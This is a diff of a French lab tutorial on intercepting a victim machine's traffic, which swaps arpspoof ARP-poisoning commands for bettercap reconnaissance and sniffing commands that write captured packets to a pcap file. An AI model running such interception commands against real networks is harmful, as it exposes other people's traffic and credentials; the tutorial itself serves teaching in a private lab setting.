@@ -306,14 +306,16 @@ ip.addr == 192.168.100.10 → trafic de la victime
 Sur Parrot :  
 bettercap -iface enp0s3
 
-Dans la console bettercap :  
-net.recon on
-net.show
+Dans la console bettercap :     
+net.recon on   
+net.show   
 
-arpspoof -i enp0s3 -t 192.168.100.10 192.168.100.1
-arpspoof -i enp0s3 -t 192.168.100.1 192.168.100.10
 
-ℹ️ Ici `192.168.100.1` représente la “passerelle” vue par la victime.  
+set net.sniff.output /root/capture.pcap   
+net.sniff on   
+
+ℹ️ Ici `192.168.100.1` représente la “passerelle” vue par la victime.   
+
 👉 Dans notre montage, où Parrot **est déjà la passerelle**, il est plus simple et plus sûr d’utiliser **Bettercap**.  
 
 📸 Exemple d’exécution :
